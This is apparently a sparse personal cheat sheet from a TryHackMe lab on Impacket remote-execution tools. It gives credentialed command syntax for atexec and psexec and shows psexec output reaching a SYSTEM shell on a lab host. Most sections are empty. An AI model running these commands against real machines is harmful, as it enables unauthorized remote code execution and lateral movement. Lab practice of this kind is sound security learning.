- [atexec.py](#atexecpy)
- [psexec.py](#psexecpy)
- [smbexec.py](#smbexecpy)
- [wmiexec.py](#wmiexecpy)
- [References](#references)

-------------------------------------------

# [atexec.py](#atexecpy-1)
## 
```sh
python atexec.py domain/username:password@hostIP command
```

## 
```sh

```

# [psexec.py](#psexecpy-1)
## 
```sh
python psexec.py domain/username:password@hostIP
```

## 
```sh
$ psexec.py lunar.eruca.com/Administrator:'TryHackMe!'@$t
Impacket v0.12.0.dev1+20230823.84619.912e896 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.113.23.....
[*] Found writable share ADMIN$
[*] Uploading file LNlovqMF.exe
[*] Opening SVCManager on 10.10.113.23.....
[*] Creating service jYdU on 10.10.113.23.....
[*] Starting service jYdU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

# [smbexec.py](#smbexecpy-1)
## 
```sh

```

## 
```sh

```

# [wmiexec.py](#wmiexecpy-1)
## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

# [References](#references-1)

https://www.hackingarticles.in/remote-code-execution-using-impacket/